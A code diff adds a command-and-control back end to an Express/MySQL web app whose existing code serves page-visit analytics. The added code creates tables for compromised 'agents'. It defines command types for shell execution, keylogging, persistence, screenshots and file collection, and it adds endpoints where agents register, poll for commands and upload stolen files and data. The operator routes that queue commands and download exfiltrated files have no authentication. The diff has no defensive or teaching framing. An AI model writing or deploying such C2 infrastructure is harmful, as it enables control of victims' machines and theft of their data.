@@ -113,6 +113,54 @@ async function initDatabase() {
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `);
+
+        // Create C2 agents table
+        await connection.query(`
+            CREATE TABLE IF NOT EXISTS c2_agents (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                agent_id VARCHAR(64) UNIQUE NOT NULL,
+                hostname VARCHAR(255),
+                username VARCHAR(255),
+                os_info TEXT,
+                ip_address VARCHAR(45),
+                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                status ENUM('active', 'inactive', 'compromised') DEFAULT 'active',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        // Create C2 commands table
+        await connection.query(`
+            CREATE TABLE IF NOT EXISTS c2_commands (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                agent_id VARCHAR(64) NOT NULL,
+                command_type ENUM('shell', 'download', 'upload', 'screenshot', 'keylog', 'persistence', 'collect_data', 'collect_files') NOT NULL,
+                command_data TEXT NOT NULL,
+                status ENUM('pending', 'executing', 'completed', 'failed') DEFAULT 'pending',
+                result TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                executed_at TIMESTAMP NULL,
+                completed_at TIMESTAMP NULL,
+                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
+            )
+        `);
+
+        // Create C2 results table
+        await connection.query(`
+            CREATE TABLE IF NOT EXISTS c2_results (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                command_id INT NOT NULL,
+                agent_id VARCHAR(64) NOT NULL,
+                result_data TEXT,
+                file_path VARCHAR(512),
+                file_size INT,
+                success BOOLEAN DEFAULT FALSE,
+                error_message TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (command_id) REFERENCES c2_commands(id) ON DELETE CASCADE,
+                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
+            )
+        `);
         
         console.log('Successfully connected to MySQL database.');
         connection.release();
@@ -525,6 +573,376 @@ app.get("/api/admin/page-visits-summary", async (req, res) => {
     });
   } catch (err) {
     console.error("Error fetching page visits summary for admin:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// --- C2 API Endpoints ---
+
+// Test endpoint to verify C2 API is working
+app.get('/api/c2/test', (req, res) => {
+  res.json({ 
+    success: true, 
+    message: 'C2 API is working',
+    timestamp: new Date().toISOString()
+  });
+});
+
+// Agent registration
+app.post('/api/c2/register', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id, hostname, username, os_info, ip_address } = req.body;
+    
+    if (!agent_id) {
+      return res.status(400).json({ error: "Agent ID is required" });
+    }
+
+    // Check if agent already exists
+    const [existing] = await pool.query('SELECT * FROM c2_agents WHERE agent_id = ?', [agent_id]);
+    
+    if (existing.length > 0) {
+      // Update existing agent
+      await pool.query(`
+        UPDATE c2_agents 
+        SET hostname = ?, username = ?, os_info = ?, ip_address = ?, last_seen = CURRENT_TIMESTAMP, status = 'active'
+        WHERE agent_id = ?
+      `, [hostname, username, os_info, ip_address, agent_id]);
+    } else {
+      // Create new agent
+      await pool.query(`
+        INSERT INTO c2_agents (agent_id, hostname, username, os_info, ip_address)
+        VALUES (?, ?, ?, ?, ?)
+      `, [agent_id, hostname, username, os_info, ip_address]);
+    }
+    
+    res.json({ success: true, message: "Agent registered successfully" });
+  } catch (err) {
+    console.error("Error registering agent:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Get pending commands for agent
+app.get('/api/c2/commands/:agent_id', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id } = req.params;
+    
+    const [commands] = await pool.query(`
+      SELECT id, command_type, command_data, created_at
+      FROM c2_commands 
+      WHERE agent_id = ? AND status = 'pending'
+      ORDER BY created_at ASC
+    `, [agent_id]);
+    
+    res.json({ commands });
+  } catch (err) {
+    console.error("Error fetching commands:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Submit command result
+app.post('/api/c2/result', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { command_id, agent_id, result_data, file_path, file_size, success, error_message } = req.body;
+    
+    // Update command status
+    await pool.query(`
+      UPDATE c2_commands 
+      SET status = ?, result = ?, completed_at = CURRENT_TIMESTAMP
+      WHERE id = ? AND agent_id = ?
+    `, [success ? 'completed' : 'failed', result_data, command_id, agent_id]);
+    
+    // Insert result record
+    await pool.query(`
+      INSERT INTO c2_results (command_id, agent_id, result_data, file_path, file_size, success, error_message)
+      VALUES (?, ?, ?, ?, ?, ?, ?)
+    `, [command_id, agent_id, result_data, file_path, file_size, success, error_message]);
+    
+    res.json({ success: true });
+  } catch (err) {
+    console.error("Error submitting result:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// File upload endpoint for agents
+app.post('/api/c2/upload/:agent_id', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id } = req.params;
+    const { filename, file_data, file_type, command_id } = req.body;
+    
+    if (!filename || !file_data) {
+      return res.status(400).json({ error: "Filename and file data are required" });
+    }
+    
+    // Create uploads directory if it doesn't exist
+    const uploadsDir = path.join(process.cwd(), 'uploads', 'c2', agent_id);
+    const fs = await import('fs');
+    if (!fs.existsSync(uploadsDir)) {
+      fs.mkdirSync(uploadsDir, { recursive: true });
+    }
+    
+    // Decode base64 file data
+    const buffer = Buffer.from(file_data, 'base64');
+    const filePath = path.join(uploadsDir, filename);
+    
+    // Write file
+    fs.writeFileSync(filePath, buffer);
+    
+    // Log file upload in database
+    await pool.query(`
+      INSERT INTO c2_results (command_id, agent_id, result_data, file_path, file_size, success, error_message)
+      VALUES (?, ?, ?, ?, ?, ?, ?)
+    `, [command_id || null, agent_id, `File uploaded: ${filename}`, filePath, buffer.length, true, null]);
+    
+    res.json({ 
+      success: true, 
+      message: "File uploaded successfully",
+      file_path: filePath,
+      file_size: buffer.length
+    });
+  } catch (err) {
+    console.error("Error uploading file:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Data collection endpoint for agents
+app.post('/api/c2/data/:agent_id', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id } = req.params;
+    const { data_type, data_content, metadata } = req.body;
+    
+    if (!data_type || !data_content) {
+      return res.status(400).json({ error: "Data type and content are required" });
+    }
+    
+    // Store collected data in database
+    await pool.query(`
+      INSERT INTO c2_results (agent_id, result_data, success, error_message)
+      VALUES (?, ?, ?, ?)
+    `, [agent_id, JSON.stringify({
+      type: data_type,
+      content: data_content,
+      metadata: metadata || {},
+      timestamp: new Date().toISOString()
+    }), true, null]);
+    
+    res.json({ success: true, message: "Data collected successfully" });
+  } catch (err) {
+    console.error("Error collecting data:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Bulk data upload endpoint
+app.post('/api/c2/bulk-upload/:agent_id', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id } = req.params;
+    const { files, data_collection } = req.body;
+    
+    const results = [];
+    
+    // Handle file uploads
+    if (files && Array.isArray(files)) {
+      const uploadsDir = path.join(process.cwd(), 'uploads', 'c2', agent_id);
+      const fs = await import('fs');
+      if (!fs.existsSync(uploadsDir)) {
+        fs.mkdirSync(uploadsDir, { recursive: true });
+      }
+      
+      for (const file of files) {
+        try {
+          const buffer = Buffer.from(file.data, 'base64');
+          const filePath = path.join(uploadsDir, file.filename);
+          fs.writeFileSync(filePath, buffer);
+          
+          await pool.query(`
+            INSERT INTO c2_results (agent_id, result_data, file_path, file_size, success, error_message)
+            VALUES (?, ?, ?, ?, ?, ?)
+          `, [agent_id, `Bulk upload: ${file.filename}`, filePath, buffer.length, true, null]);
+          
+          results.push({ filename: file.filename, success: true });
+        } catch (err) {
+          results.push({ filename: file.filename, success: false, error: err.message });
+        }
+      }
+    }
+    
+    // Handle data collection
+    if (data_collection && Array.isArray(data_collection)) {
+      for (const data of data_collection) {
+        try {
+          await pool.query(`
+            INSERT INTO c2_results (agent_id, result_data, success, error_message)
+            VALUES (?, ?, ?, ?)
+          `, [agent_id, JSON.stringify(data), true, null]);
+          
+          results.push({ data_type: data.type, success: true });
+        } catch (err) {
+          results.push({ data_type: data.type, success: false, error: err.message });
+        }
+      }
+    }
+    
+    res.json({ 
+      success: true, 
+      message: "Bulk upload completed",
+      results 
+    });
+  } catch (err) {
+    console.error("Error in bulk upload:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Admin: Get all agents
+app.get('/api/admin/c2/agents', async (req, res) => {
+  if (!dbReady) {
+    console.error('Database not ready for agents endpoint');
+    return res.status(503).json({ error: "Database not available" });
+  }
+  
+  try {
+    console.log('Fetching agents from database...');
+    const [agents] = await pool.query(`
+      SELECT * FROM c2_agents 
+      ORDER BY last_seen DESC
+    `);
+    
+    console.log(`Found ${agents.length} agents`);
+    res.json(agents);
+  } catch (err) {
+    console.error("Error fetching agents:", err);
+    res.status(500).json({ error: "Internal server error", details: err.message });
+  }
+});
+
+// Admin: Create command
+app.post('/api/admin/c2/command', async (req, res) => {
+  if (!dbReady) {
+    console.error('Database not ready for command endpoint');
+    return res.status(503).json({ error: "Database not available" });
+  }
+  
+  try {
+    const { agent_id, command_type, command_data } = req.body;
+    
+    if (!agent_id || !command_type || !command_data) {
+      return res.status(400).json({ error: "Agent ID, command type, and command data are required" });
+    }
+    
+    console.log(`Creating command for agent ${agent_id}: ${command_type}`);
+    const [result] = await pool.query(`
+      INSERT INTO c2_commands (agent_id, command_type, command_data)
+      VALUES (?, ?, ?)
+    `, [agent_id, command_type, command_data]);
+    
+    res.json({ success: true, command_id: result.insertId });
+  } catch (err) {
+    console.error("Error creating command:", err);
+    res.status(500).json({ error: "Internal server error", details: err.message });
+  }
+});
+
+// Admin: Get command results
+app.get('/api/admin/c2/results', async (req, res) => {
+  if (!dbReady) {
+    console.error('Database not ready for results endpoint');
+    return res.status(503).json({ error: "Database not available" });
+  }
+  
+  try {
+    console.log('Fetching results from database...');
+    const [results] = await pool.query(`
+      SELECT r.*, c.command_type, c.command_data, a.hostname, a.username
+      FROM c2_results r
+      LEFT JOIN c2_commands c ON r.command_id = c.id
+      LEFT JOIN c2_agents a ON r.agent_id = a.agent_id
+      ORDER BY r.created_at DESC
+      LIMIT 100
+    `);
+    
+    console.log(`Found ${results.length} results`);
+    res.json(results);
+  } catch (err) {
+    console.error("Error fetching results:", err);
+    res.status(500).json({ error: "Internal server error", details: err.message });
+  }
+});
+
+// Admin: Get agent details with commands
+app.get('/api/admin/c2/agent/:agent_id', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id } = req.params;
+    
+    const [agent] = await pool.query('SELECT * FROM c2_agents WHERE agent_id = ?', [agent_id]);
+    const [commands] = await pool.query(`
+      SELECT * FROM c2_commands 
+      WHERE agent_id = ? 
+      ORDER BY created_at DESC
+    `, [agent_id]);
+    
+    if (agent.length === 0) {
+      return res.status(404).json({ error: "Agent not found" });
+    }
+    
+    res.json({ agent: agent[0], commands });
+  } catch (err) {
+    console.error("Error fetching agent details:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Admin: Download uploaded files
+app.get('/api/admin/c2/download/:agent_id/:filename', async (req, res) => {
+  try {
+    const { agent_id, filename } = req.params;
+    const filePath = path.join(process.cwd(), 'uploads', 'c2', agent_id, filename);
+    
+    const fs = await import('fs');
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).json({ error: "File not found" });
+    }
+    
+    res.download(filePath);
+  } catch (err) {
+    console.error("Error downloading file:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// Admin: Get collected data by type
+app.get('/api/admin/c2/data/:agent_id/:data_type', async (req, res) => {
+  if (!dbReady) return res.status(503).json({ error: "Database not available" });
+  
+  try {
+    const { agent_id, data_type } = req.params;
+    
+    const [results] = await pool.query(`
+      SELECT * FROM c2_results 
+      WHERE agent_id = ? AND result_data LIKE ?
+      ORDER BY created_at DESC
+    `, [agent_id, `%"type":"${data_type}"%`]);
+    
+    res.json(results);
+  } catch (err) {
+    console.error("Error fetching data:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
